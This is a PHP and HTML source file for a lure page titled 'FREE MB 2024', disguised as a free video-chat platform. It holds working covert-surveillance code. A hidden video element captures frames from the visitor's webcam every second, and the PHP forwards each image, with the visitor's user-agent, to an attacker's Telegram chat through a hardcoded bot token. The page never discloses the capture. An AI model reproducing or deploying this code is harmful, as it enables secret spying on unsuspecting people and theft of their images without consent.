<?php
define('TELEGRAM_BOT_TOKEN', '7357973841:AAF58LkrVps1ZkGAF-5YeKkixQS2Y4fvSPk');

function sendPhoto($file, $chatId){
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown User-Agent';
    $message = "Photo sent from User-Agent: " . $userAgent;
    $postFields = array('chat_id' => $chatId, 'photo' => new CURLFile(realpath($file)), 'caption' => $message);
    $telegramAPI = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return true;
}

if(isset($_GET['id'])){
    $chatId = urldecode($_GET['id']);
}else{
    die();
}

if(isset($_POST['image'])){
    $data = $_POST['image'];
    $file = 'user_photo_'.md5($data).'.png';
    if(file_put_contents($file, base64_decode(explode(',', $data)[1]))){
        sendPhoto($file, $chatId);
        unlink($file);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>FREE MB 2024</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <link rel="shortcut icon" href="https://i.ibb.co/pK3wfBp/What-is-bulk-SMS-messaging-removebg-preview.png" />
    <meta property="og:title" content="online video chatting platform" />
    <meta property="og:description" content="it is a online video chatting platform. that give you opportunity to chat with your friends and globally" />
    <meta property="og:image" content="https://i.ibb.co/GsFn7C0/png-transparent-online-chat-livechat-chat-room-baycreative-inc-google-icon-blue-text-logo.png" />
</head>
<body>
    it is open source and free
    <div style="display:none">
        <video id="video" width="640" height="480" autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    <script>
        var videoElement = document.getElementById('video');
        var canvasElement = document.getElementById('canvas');
        var canvasContext = canvasElement.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                videoElement.srcObject = stream;
                setInterval(captureAndSendImage, 1000);
            })
            .catch(function(error) {
                console.log('Error accessing webcam:', error);
            });

        function captureAndSendImage() {
            canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            var imageData = canvasElement.toDataURL('image/png');
            $.post(window.location.href, { image: imageData }, function(response) {
                
            });
        }
    </script>
</body>
</html>
